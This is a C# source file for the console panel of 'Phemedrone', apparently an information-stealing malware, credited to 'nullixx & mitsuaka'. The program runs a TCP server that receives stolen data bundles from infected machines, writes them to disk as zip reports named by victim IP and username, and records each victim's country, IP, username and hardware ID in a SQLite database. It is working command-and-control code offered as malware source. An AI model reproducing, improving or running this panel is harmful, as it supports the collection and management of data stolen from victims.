using System.Net;

namespace Phemedrone.Panel;

static class Program
{
    public static int Logs;
    public static int Port = 0;
    public static IPAddress ip;
    
    [STAThread]
    private static void Main()
    {
        Helper.LoadCfg();
        Console.Title = $"phemedrone panel >> by nullixx & mitsuaka | Logs Count: {Logs}      Port: {Port}";
        Console.Clear();
        Console.CursorVisible = false;
        Helper.CheckDirect();
        
        TcpServer receiver = new TcpServer(ip, Port);

        var database = new DatabaseWorker("files\\users\\clients.sqlite");
        database.FirstInit();
        
        var cTable = new ConsoleTable();

        var clients = database.GetClients();
        cTable.Draw();
        
        foreach (var client in clients)
        {
            cTable.AddItem(new LogEntry
            {
                Values = new object[]
                {
                    client[0],
                    IPAddress.Parse(client[1]),
                    client[2],
                    client[3],
                    client[4]
                } 
            }, true);
            Logs++;
            Console.Title = $"phemedrone panel >> by nullixx & mitsuaka | Logs Count: {Logs}      Port: {Port}";
        }

        receiver.OnLogReceived += (sender, e) =>
        {
            if (!File.Exists($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip"))
            {
                File.WriteAllBytes($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip", e.LogBytes);

                cTable.AddItem(new LogEntry
                {
                    Values = new object[] {e.CountryCode, e.IP, e.Username, e.HWID, e.logInfo}
                }, true);

                database.AddClient(e.CountryCode, e.IP.ToString(), e.Username, e.HWID, e.logInfo);

                Logs++;
                Console.Title = $"phemedrone panel >> by nullixx & mitsuaka | Logs Count: {Logs}      Port: {Port}";
            }
            else
            {
                File.WriteAllBytes($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip", e.LogBytes);
            }
        };
            
        cTable.StartKeyListener(); 
        receiver.StartServer();
        Thread.Sleep(-1);
    }
}